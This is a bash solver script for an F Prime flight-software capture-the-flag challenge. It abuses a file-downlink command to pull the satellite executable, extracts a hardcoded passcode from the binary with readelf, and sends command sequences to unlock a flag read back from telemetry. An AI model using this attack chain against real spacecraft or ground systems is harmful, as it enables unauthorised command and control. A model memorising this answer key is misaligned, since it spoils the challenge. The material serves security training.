#!/bin/bash

echo "Solver for fprime-exploitation challenge"
# source /home/ground/fprime/fprime-venv/bin/activate

echo "Source python virtual env activate"
. ./fprime-venv/bin/activate

BASE_IP=${CHAL_HOST:-localhost}
BASE_PORT=${CHAL_PORT:-5000}

WEB_IP=${BASE_IP}
WEB_PORT=${BASE_PORT}
GDS_IP=${BASE_IP}
GDS_PORT=$((BASE_PORT + 1))

WAIT_FOR_DOWNLINK=${WAIT_FOR_DOWNLINK:-20}

echo "Get FSW Binary using ground commands"
echo "fprime-cli command-send fileDownlink.SendFile --arguments "satellite.exe" "satellite.exe" -d ./dict/RefTopologyAppDictionary.xml -ip \"${GDS_IP}\" -p \"${GDS_PORT}\""
fprime-cli command-send fileDownlink.SendFile --arguments "satellite.exe" "satellite.exe" -d ./dict/RefTopologyAppDictionary.xml -ip "${GDS_IP}" -p "${GDS_PORT}"

echo "sleep ${WAIT_FOR_DOWNLINK} to wait for satellite.exe to downlink from spacecraft"
sleep ${WAIT_FOR_DOWNLINK}

echo "Download executable from ground web server"
if [ -f ./satellite.exe ];then
    rm ./satellite.exe
fi
echo "wget http://${WEB_IP}:${WEB_PORT}/download/files/satellite.exe"
wget http://${WEB_IP}:${WEB_PORT}/download/files/satellite.exe

if [ ! -f ./satellite.exe ]; then
    echo "Could not download spacecraft executable satellite.exe, ERROR!!!"
    exit 1
fi

file satellite.exe

myPasscode=$(readelf -p.rodata satellite.exe | grep -A4 ThisIsNotTheFlagYouAreLookingFor | tail -n1 | awk -F" " ' { print substr($3,1,16) } ')
# readelf -Ws satellite.exe | grep theFlagCode | awk -F" " ' { print $2 } '\\
# myPasscode="123456"
echo "Passcode: ${myPasscode}"
if [ -z "${myPasscode}" ]; then
    echo "Could not get passcode, ERROR!!!"
    exit 1
fi

echo "Send 5 noops to get FlagSvr in correct state"
echo "fprime-cli command-send flagSvr.FS_FlagSvrNoop -d ./dict/RefTopologyAppDictionary.xml -ip ${GDS_IP} -p ${GDS_PORT}"
fprime-cli command-send flagSvr.FS_FlagSvrNoop -d ./dict/RefTopologyAppDictionary.xml -ip "${GDS_IP}" -p "${GDS_PORT}"
echo "fprime-cli command-send flagSvr.FS_FlagSvrNoop -d ./dict/RefTopologyAppDictionary.xml -ip ${GDS_IP} -p ${GDS_PORT}"
fprime-cli command-send flagSvr.FS_FlagSvrNoop -d ./dict/RefTopologyAppDictionary.xml -ip "${GDS_IP}" -p "${GDS_PORT}"
echo "fprime-cli command-send flagSvr.FS_FlagSvrNoop -d ./dict/RefTopologyAppDictionary.xml -ip ${GDS_IP} -p ${GDS_PORT}"
fprime-cli command-send flagSvr.FS_FlagSvrNoop -d ./dict/RefTopologyAppDictionary.xml -ip "${GDS_IP}" -p "${GDS_PORT}"
echo "fprime-cli command-send flagSvr.FS_FlagSvrNoop -d ./dict/RefTopologyAppDictionary.xml -ip ${GDS_IP} -p ${GDS_PORT}"
fprime-cli command-send flagSvr.FS_FlagSvrNoop -d ./dict/RefTopologyAppDictionary.xml -ip "${GDS_IP}" -p "${GDS_PORT}"
echo "fprime-cli command-send flagSvr.FS_FlagSvrNoop -d ./dict/RefTopologyAppDictionary.xml -ip ${GDS_IP} -p ${GDS_PORT}"
fprime-cli command-send flagSvr.FS_FlagSvrNoop -d ./dict/RefTopologyAppDictionary.xml -ip "${GDS_IP}" -p "${GDS_PORT}"

echo "Start TLM Listeners"
fprime-cli channels -j -t 20 -i 2701 -d ./dict/RefTopologyAppDictionary.xml -ip "${GDS_IP}" -p "${GDS_PORT}" > data_0.json &
fprime-cli channels -j -t 20 -i 2702 -d ./dict/RefTopologyAppDictionary.xml -ip "${GDS_IP}" -p "${GDS_PORT}" > data_1.json &
fprime-cli channels -j -t 20 -i 2703 -d ./dict/RefTopologyAppDictionary.xml -ip "${GDS_IP}" -p "${GDS_PORT}" > data_2.json &
fprime-cli channels -j -t 20 -i 2704 -d ./dict/RefTopologyAppDictionary.xml -ip "${GDS_IP}" -p "${GDS_PORT}" > data_3.json &


echo "Send Passcode ${myPasscode}"
echo "fprime-cli command-send flagSvr.FS_FlagEnable --arguments "${myPasscode}" -d ./dict/RefTopologyAppDictionary.xml -ip \"${GDS_IP}\" -p \"${GDS_PORT}\""
fprime-cli command-send flagSvr.FS_FlagEnable --arguments "${myPasscode}" -d ./dict/RefTopologyAppDictionary.xml -ip "${GDS_IP}" -p "${GDS_PORT}"

echo "Sleep 20 for TLM updates"
sleep 20

echo "FLAG:"
cat data_0.json | jq -r ".val_str" | tr -d '\n' > flag.out
cat data_1.json | jq -r ".val_str" | tr -d '\n' >> flag.out
cat data_2.json | jq -r ".val_str" | tr -d '\n' >> flag.out
cat data_3.json | jq -r ".val_str" | tr -d '\n' >> flag.out 

cat flag.out
